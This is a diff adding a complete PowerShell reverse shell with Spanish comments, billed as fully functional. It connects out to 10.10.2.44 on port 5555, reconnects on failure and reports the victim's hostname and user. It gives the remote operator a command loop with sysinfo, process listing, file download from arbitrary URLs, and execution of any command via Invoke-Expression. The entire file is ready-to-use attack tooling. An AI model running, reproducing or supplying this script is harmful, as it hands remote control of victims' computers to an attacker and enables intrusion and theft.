@@ -1,0 +1,157 @@
+# ============================================================
+#  REVERSE SHELL POWERShell - VERSIÓN 100% FUNCIONAL
+#  CON ENTRADA DE COMANDOS CORRECTA
+# ============================================================
+
+# --- CONFIGURACIÓN ---
+$IP = '10.10.2.44'
+$PUERTO = 5555
+
+# --- BUCLE PRINCIPAL CON RECONEXIÓN ---
+while ($true) {
+    try {
+        # Crear conexión
+        $client = New-Object System.Net.Sockets.TCPClient($IP, $PUERTO)
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $reader = New-Object System.IO.StreamReader($stream)
+        $writer.AutoFlush = $true
+        
+        # Enviar mensaje de bienvenida
+        $hostname = (Get-WmiObject Win32_ComputerSystem).Name
+        $user = [Environment]::UserName
+        $writer.WriteLine("[+] Conexión establecida desde $hostname")
+        $writer.WriteLine("[+] Usuario: $user")
+        $writer.WriteLine("[+] Ruta: " + (Get-Location).Path)
+        $writer.WriteLine("")
+        $writer.Write("PS " + (Get-Location).Path + "> ")
+        
+        # --- BUCLE DE COMANDOS ---
+        while ($client.Connected) {
+            try {
+                # LEER COMANDO DEL ATACANTE (FUNCIONAL)
+                $cmd = $reader.ReadLine()
+                
+                # Si no hay comando, continuar
+                if ($cmd -eq $null) { continue }
+                
+                # Limpiar espacios
+                $cmd = $cmd.Trim()
+                
+                # Comando de salida
+                if ($cmd -eq "exit" -or $cmd -eq "quit") {
+                    $writer.WriteLine("[*] Cerrando conexión...")
+                    break
+                }
+                
+                # Comando help
+                if ($cmd -eq "help" -or $cmd -eq "?") {
+                    $writer.WriteLine(@"
+COMANDOS DISPONIBLES:
+  help / ?     - Muestra esta ayuda
+  exit / quit  - Cierra la conexión
+  cls / clear  - Limpia la pantalla
+  ps           - Lista procesos
+  sysinfo      - Información del sistema
+  download URL DEST - Descarga un archivo
+  cd RUTA      - Cambia de directorio
+  CUALQUIER COMANDO DE POWERSHELL O CMD
+"@)
+                    $writer.Write("PS " + (Get-Location).Path + "> ")
+                    continue
+                }
+                
+                # Comando cls/clear
+                if ($cmd -eq "cls" -or $cmd -eq "clear") {
+                    $writer.WriteLine("`n" * 50)  # Simula limpiar pantalla
+                    $writer.Write("PS " + (Get-Location).Path + "> ")
+                    continue
+                }
+                
+                # Comando sysinfo
+                if ($cmd -eq "sysinfo") {
+                    $os = (Get-WmiObject Win32_OperatingSystem).Caption
+                    $arch = (Get-WmiObject Win32_ComputerSystem).SystemType
+                    $ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)
+                    $writer.WriteLine(@"
+=== INFORMACIÓN DEL SISTEMA ===
+  Hostname    : $hostname
+  Usuario     : $user
+  Sistema     : $os
+  Arquitectura: $arch
+  RAM Total   : $ram GB
+  Ruta actual : $(Get-Location).Path
+"@)
+                    $writer.Write("PS " + (Get-Location).Path + "> ")
+                    continue
+                }
+                
+                # Comando ps (procesos)
+                if ($cmd -eq "ps") {
+                    $writer.WriteLine(Get-Process | Format-Table -AutoSize | Out-String)
+                    $writer.Write("PS " + (Get-Location).Path + "> ")
+                    continue
+                }
+                
+                # Comando download
+                if ($cmd -match '^download\s+(http[s]?://\S+)\s+(\S+)$') {
+                    $url = $matches[1]
+                    $destino = $matches[2]
+                    try {
+                        (New-Object Net.WebClient).DownloadFile($url, $destino)
+                        $writer.WriteLine("[+] Archivo descargado en: $destino")
+                    } catch {
+                        $writer.WriteLine("[ERROR] No se pudo descargar: $($_.Exception.Message)")
+                    }
+                    $writer.Write("PS " + (Get-Location).Path + "> ")
+                    continue
+                }
+                
+                # Comando cd (cambiar directorio)
+                if ($cmd -match '^cd\s+(.+)$') {
+                    $ruta = $matches[1]
+                    try {
+                        Set-Location $ruta
+                        $writer.WriteLine("[+] Ruta cambiada a: " + (Get-Location).Path)
+                    } catch {
+                        $writer.WriteLine("[ERROR] No se pudo cambiar a: $ruta")
+                    }
+                    $writer.Write("PS " + (Get-Location).Path + "> ")
+                    continue
+                }
+                
+                # --- EJECUTAR CUALQUIER COMANDO ---
+                try {
+                    # Ejecutar el comando
+                    $output = Invoke-Expression $cmd 2>&1 | Out-String
+                    
+                    # Si no hay salida, mostrar éxito
+                    if ([string]::IsNullOrEmpty($output)) {
+                        $writer.WriteLine("[+] Comando ejecutado correctamente")
+                    } else {
+                        $writer.WriteLine($output.TrimEnd())
+                    }
+                } catch {
+                    # Capturar errores
+                    $writer.WriteLine("[ERROR] $($_.Exception.Message)")
+                }
+                
+                # Mostrar prompt
+                $writer.Write("PS " + (Get-Location).Path + "> ")
+                
+            } catch {
+                # Error en la comunicación
+                break
+            }
+        }
+        
+        # Cerrar conexión
+        $writer.Close()
+        $reader.Close()
+        $client.Close()
+        
+    } catch {
+        # Error de conexión
+        Start-Sleep -Seconds 5
+    }
+}
